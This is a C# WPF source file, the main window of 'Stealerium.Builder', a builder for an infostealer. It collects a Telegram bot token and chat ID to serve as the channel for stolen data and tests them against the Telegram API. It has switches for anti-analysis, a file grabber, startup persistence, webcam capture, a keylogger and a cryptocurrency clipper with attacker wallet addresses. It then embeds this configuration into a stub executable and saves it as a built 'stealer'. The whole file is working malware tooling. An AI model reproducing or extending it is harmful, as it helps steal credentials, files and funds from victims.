using System;
using System.Windows;
using System.Windows.Controls;
using System.Linq;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Media;
using Wpf.Ui.Controls;
using System.Threading.Tasks;
using System.Net.Http;
using Microsoft.Win32;
using Wpf.Ui;

namespace Stealerium.Builder
{
    public partial class MainWindow : FluentWindow
    {
        private string stubPath = string.Empty;
        private bool isStubDetected = false;
        private bool isApiTokenValid = false;
        private bool isChatIdValid = false;

        public MainWindow()
        {
            InitializeComponent();
            CheckStubFile();
            InitializeUI();
        }

        private void InitializeUI()
        {
            // Set initial states
            StubStatusLabel.IsOpen = false;
            WebhookStatusLabel.IsOpen = false;
            ChatIdTextBox.IsEnabled = false;

            // Set tooltips for better UX
            ApiTokenTextBox.PlaceholderText = "Enter your Telegram bot API token";
            ChatIdTextBox.PlaceholderText = "Enter your Telegram chat ID";

            DebugCheckBox.ToolTip = "Enable debug mode for detailed logging";
            AntiAnalysisCheckBox.ToolTip = "Enable anti-analysis protection";
            RandomStartDelayCheckBox.ToolTip = "Add random delay on startup";
            FileGrabberCheckBox.ToolTip = "Enable file grabber functionality";
            AutorunCheckBox.ToolTip = "Enable autorun on system startup";
            WebcamCheckBox.ToolTip = "Enable webcam screenshot capture";
            KeyloggerCheckBox.ToolTip = "Enable keylogger functionality";
            ClipperCheckBox.ToolTip = "Enable crypto clipper functionality";

            // Set initial button states
            TestTelegramButton.IsEnabled = false;
            BuildButton.IsEnabled = false;

            // Show welcome message
            BuildStatusLabel.Title = "Welcome";
            BuildStatusLabel.Message = "Configure your build settings and click Build when ready.";
            BuildStatusLabel.Severity = InfoBarSeverity.Informational;
            BuildStatusLabel.IsOpen = true;
        }

        private void CheckStubFile()
        {
            stubPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Stub", "stub.exe");

            if (File.Exists(stubPath))
            {
                StubStatusLabel.Title = "Stub Status";
                StubStatusLabel.Message = "Stub detected successfully";
                StubStatusLabel.Severity = InfoBarSeverity.Success;
                StubStatusLabel.IsOpen = true;
                StubStatusLabel.IsClosable = false;
                isStubDetected = true;
            }
            else
            {
                StubStatusLabel.Title = "Stub Status";
                StubStatusLabel.Message = "Stub not found! Please place stub.exe in the 'Stub' folder.";
                StubStatusLabel.Severity = InfoBarSeverity.Error;
                StubStatusLabel.IsOpen = true;
                StubStatusLabel.IsClosable = false;
                isStubDetected = false;
            }

            UpdateBuildButtonState();
        }

        private void UpdateBuildButtonState()
        {
            BuildButton.IsEnabled = isStubDetected && isApiTokenValid && isChatIdValid;
            BuildButton.Appearance = BuildButton.IsEnabled ? Wpf.Ui.Controls.ControlAppearance.Success : Wpf.Ui.Controls.ControlAppearance.Secondary;
        }

        private async void ApiTokenTextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            var token = ApiTokenTextBox.Text.Trim();
            TestTelegramButton.IsEnabled = !string.IsNullOrEmpty(token) && !string.IsNullOrEmpty(ChatIdTextBox.Text.Trim());

            if (string.IsNullOrEmpty(token))
            {
                isApiTokenValid = false;
                ChatIdTextBox.IsEnabled = false;
                WebhookStatusLabel.Title = "Validation Error";
                WebhookStatusLabel.Message = "Telegram API token cannot be empty";
                WebhookStatusLabel.Severity = InfoBarSeverity.Warning;
                WebhookStatusLabel.IsOpen = true;
                UpdateBuildButtonState();
                return;
            }

            LoadingOverlay.Visibility = Visibility.Visible;
            isApiTokenValid = await Telegram.TokenIsValidAsync(token);

            if (isApiTokenValid)
            {
                ChatIdTextBox.IsEnabled = true;
                WebhookStatusLabel.Title = "Validation Success";
                WebhookStatusLabel.Message = "Telegram API token is valid";
                WebhookStatusLabel.Severity = InfoBarSeverity.Success;
            }
            else
            {
                ChatIdTextBox.IsEnabled = false;
                WebhookStatusLabel.Title = "Validation Error";
                WebhookStatusLabel.Message = "Invalid Telegram API token";
                WebhookStatusLabel.Severity = InfoBarSeverity.Error;
            }

            WebhookStatusLabel.IsOpen = true;
            LoadingOverlay.Visibility = Visibility.Collapsed;
            UpdateBuildButtonState();
        }

        private async void ChatIdTextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            var token = ApiTokenTextBox.Text.Trim();
            var chatId = ChatIdTextBox.Text.Trim();
            TestTelegramButton.IsEnabled = !string.IsNullOrEmpty(token) && !string.IsNullOrEmpty(chatId);

            if (string.IsNullOrEmpty(chatId))
            {
                isChatIdValid = false;
                WebhookStatusLabel.Title = "Validation Error";
                WebhookStatusLabel.Message = "Telegram chat ID cannot be empty";
                WebhookStatusLabel.Severity = InfoBarSeverity.Warning;
                WebhookStatusLabel.IsOpen = true;
                UpdateBuildButtonState();
                return;
            }

            if (string.IsNullOrEmpty(token))
            {
                WebhookStatusLabel.Title = "Validation Error";
                WebhookStatusLabel.Message = "Please enter a Telegram API token first";
                WebhookStatusLabel.Severity = InfoBarSeverity.Warning;
                WebhookStatusLabel.IsOpen = true;
                return;
            }

            LoadingOverlay.Visibility = Visibility.Visible;
            isChatIdValid = await ValidateChatIdAsync(token, chatId);

            if (isChatIdValid)
            {
                WebhookStatusLabel.Title = "Validation Success";
                WebhookStatusLabel.Message = "Telegram chat ID is valid";
                WebhookStatusLabel.Severity = InfoBarSeverity.Success;
            }
            else
            {
                WebhookStatusLabel.Title = "Validation Error";
                WebhookStatusLabel.Message = "Invalid Telegram chat ID";
                WebhookStatusLabel.Severity = InfoBarSeverity.Error;
            }

            WebhookStatusLabel.IsOpen = true;
            LoadingOverlay.Visibility = Visibility.Collapsed;
            UpdateBuildButtonState();
        }

        private async Task<bool> ValidateChatIdAsync(string token, string chatId)
        {
            try
            {
                string testMessage = "Validating chat ID...";
                string telegramApiUrl = $"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(testMessage)}";

                using (HttpClient client = new HttpClient())
                {
                    HttpResponseMessage response = await client.GetAsync(telegramApiUrl);
                    return response.IsSuccessStatusCode;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        private async void TestTelegramButton_Click(object sender, RoutedEventArgs e)
        {
            var token = ApiTokenTextBox.Text.Trim();
            var chatId = ChatIdTextBox.Text.Trim();

            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId))
            {
                var messageBox = new Wpf.Ui.Controls.MessageBox
                {
                    Title = "Validation Error",
                    Content = "Please enter both Telegram API token and chat ID."
                };
                await messageBox.ShowDialogAsync();
                return;
            }

            TestTelegramButton.IsEnabled = false;
            LoadingOverlay.Visibility = Visibility.Visible;

            bool isTokenValid = await Telegram.TokenIsValidAsync(token);
            if (!isTokenValid)
            {
                WebhookStatusLabel.Title = "Connection Error";
                WebhookStatusLabel.Message = "Invalid Telegram API token";
                WebhookStatusLabel.Severity = InfoBarSeverity.Error;
                WebhookStatusLabel.IsOpen = true;
            }
            else
            {
                int messageId = await Telegram.SendMessageAsync("✅ *Stealerium* builder connected successfully!", token, chatId);
                if (messageId > 0)
                {
                    WebhookStatusLabel.Title = "Connection Success";
                    WebhookStatusLabel.Message = "Connected to Telegram successfully!";
                    WebhookStatusLabel.Severity = InfoBarSeverity.Success;
                }
                else
                {
                    WebhookStatusLabel.Title = "Connection Error";
                    WebhookStatusLabel.Message = "Failed to send test message";
                    WebhookStatusLabel.Severity = InfoBarSeverity.Error;
                }
            }

            LoadingOverlay.Visibility = Visibility.Collapsed;
            TestTelegramButton.IsEnabled = true;
            UpdateBuildButtonState();
        }

        private async void BuildButton_Click(object sender, RoutedEventArgs e)
        {
            BuildButton.IsEnabled = false;
            BuildProgressBar.Visibility = Visibility.Visible;
            LoadingOverlay.Visibility = Visibility.Visible;
            BuildStatusLabel.IsOpen = false;

            try
            {
                // Validate Telegram settings
                if (string.IsNullOrWhiteSpace(ApiTokenTextBox.Text) || string.IsNullOrWhiteSpace(ChatIdTextBox.Text))
                {
                    BuildStatusLabel.Title = "Validation Error";
                    BuildStatusLabel.Message = "Please enter both Telegram Bot API Token and Chat ID.";
                    BuildStatusLabel.Severity = InfoBarSeverity.Error;
                    BuildStatusLabel.IsOpen = true;
                    return;
                }

                // Set configuration values
                Build.ConfigValues["TelegramAPI"] = Crypt.EncryptConfig(ApiTokenTextBox.Text.Trim());
                Build.ConfigValues["TelegramID"] = Crypt.EncryptConfig(ChatIdTextBox.Text.Trim());
                Build.ConfigValues["Debug"] = DebugCheckBox.IsChecked == true ? "1" : "0";
                Build.ConfigValues["AntiAnalysis"] = AntiAnalysisCheckBox.IsChecked == true ? "1" : "0";
                Build.ConfigValues["StartDelay"] = RandomStartDelayCheckBox.IsChecked == true ? "1" : "0";
                Build.ConfigValues["Grabber"] = FileGrabberCheckBox.IsChecked == true ? "1" : "0";
                Build.ConfigValues["Startup"] = AutorunCheckBox.IsChecked == true ? "1" : "0";
                Build.ConfigValues["WebcamScreenshot"] = WebcamCheckBox.IsChecked == true ? "1" : "0";
                Build.ConfigValues["Keylogger"] = KeyloggerCheckBox.IsChecked == true ? "1" : "0";
                Build.ConfigValues["Clipper"] = ClipperCheckBox.IsChecked == true ? "1" : "0";

                if (Build.ConfigValues["Clipper"] == "1")
                {
                    if (string.IsNullOrWhiteSpace(ClipperBTCTextBox.Text) && 
                        string.IsNullOrWhiteSpace(ClipperETHTextBox.Text) && 
                        string.IsNullOrWhiteSpace(ClipperLTCTextBox.Text))
                    {
                        BuildStatusLabel.Title = "Validation Error";
                        BuildStatusLabel.Message = "Please enter at least one cryptocurrency address for the clipper.";
                        BuildStatusLabel.Severity = InfoBarSeverity.Error;
                        BuildStatusLabel.IsOpen = true;
                        return;
                    }

                    Build.ConfigValues["ClipperBTC"] = Crypt.EncryptConfig(ClipperBTCTextBox.Text.Trim());
                    Build.ConfigValues["ClipperETH"] = Crypt.EncryptConfig(ClipperETHTextBox.Text.Trim());
                    Build.ConfigValues["ClipperLTC"] = Crypt.EncryptConfig(ClipperLTCTextBox.Text.Trim());
                }

                SaveFileDialog saveFileDialog = new SaveFileDialog
                {
                    Title = "Save Built Stub",
                    Filter = "Executable Files (*.exe)|*.exe",
                    FileName = "build.exe"
                };

                if (saveFileDialog.ShowDialog() == true)
                {
                    try
                    {
                        var buildPath = Build.BuildStub(saveFileDialog.FileName, stubPath);
                        BuildStatusLabel.Title = "Build Successful";
                        BuildStatusLabel.Message = $"Stealer built successfully and saved to: {buildPath}";
                        BuildStatusLabel.Severity = InfoBarSeverity.Success;
                        BuildStatusLabel.IsOpen = true;
                    }
                    catch (Exception ex)
                    {
                        BuildStatusLabel.Title = "Build Failed";
                        BuildStatusLabel.Message = $"Failed to build stealer: {ex.Message}";
                        BuildStatusLabel.Severity = InfoBarSeverity.Error;
                        BuildStatusLabel.IsOpen = true;
                    }
                }
                else
                {
                    BuildStatusLabel.Title = "Build Cancelled";
                    BuildStatusLabel.Message = "Build process was cancelled by user.";
                    BuildStatusLabel.Severity = InfoBarSeverity.Warning;
                    BuildStatusLabel.IsOpen = true;
                }
            }
            catch (Exception ex)
            {
                BuildStatusLabel.Title = "Error";
                BuildStatusLabel.Message = $"An unexpected error occurred: {ex.Message}";
                BuildStatusLabel.Severity = InfoBarSeverity.Error;
                BuildStatusLabel.IsOpen = true;
            }
            finally
            {
                BuildButton.IsEnabled = true;
                BuildProgressBar.Visibility = Visibility.Collapsed;
                LoadingOverlay.Visibility = Visibility.Collapsed;
            }
        }

        private void AutorunCheckBox_Checked(object sender, RoutedEventArgs e)
        {
            WebcamCheckBox.IsEnabled = true;
            KeyloggerCheckBox.IsEnabled = true;
            ClipperCheckBox.IsEnabled = true;
        }

        private void AutorunCheckBox_Unchecked(object sender, RoutedEventArgs e)
        {
            WebcamCheckBox.IsEnabled = false;
            WebcamCheckBox.IsChecked = false;
            KeyloggerCheckBox.IsEnabled = false;
            KeyloggerCheckBox.IsChecked = false;
            ClipperCheckBox.IsEnabled = false;
            ClipperCheckBox.IsChecked = false;
        }

        private void ClipperCheckBox_Checked(object sender, RoutedEventArgs e)
        {
            ClipperAddressesPanel.Visibility = Visibility.Visible;
        }

        private void ClipperCheckBox_Unchecked(object sender, RoutedEventArgs e)
        {
            ClipperAddressesPanel.Visibility = Visibility.Collapsed;
            ClipperBTCTextBox.Text = string.Empty;
            ClipperETHTextBox.Text = string.Empty;
            ClipperLTCTextBox.Text = string.Empty;
        }
    }
}
